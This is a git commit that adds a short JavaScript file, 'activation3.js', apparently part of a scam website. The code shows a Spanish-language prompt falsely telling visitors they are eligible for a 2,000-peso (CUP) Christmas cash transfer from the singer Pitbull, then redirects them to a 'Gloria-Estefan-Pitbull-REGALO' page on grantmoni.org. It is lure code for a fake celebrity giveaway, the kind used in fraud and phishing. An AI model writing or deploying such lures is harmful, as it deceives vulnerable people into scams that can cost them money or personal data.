5bbd9b7c6cf7852ab575bd5c70770b9712e23688
grntmoni <casket-90-crystal@icloud.com>
2025-12-24 13:17:06 +0100

    Create activation3.js

---
+++ activation3.js
@@ -0,0 +1,5 @@
+var password = 'Enviar ahora'
+password = prompt('Portal de Regalos: ¡Felicidades! Eres elegible para recibir la transferencia en efectivo navideña de Pitbull de 2,000 pesos (CUP). Por favor presiona OK para continuar y recibir tus 2,000 pesos (CUP) ahora','Enviar ahora');
+if (password != 'Enviar ahora') {
+location.href='https://grantmoni.org/Gloria-Estefan-Pitbull-REGALO.html';
+}
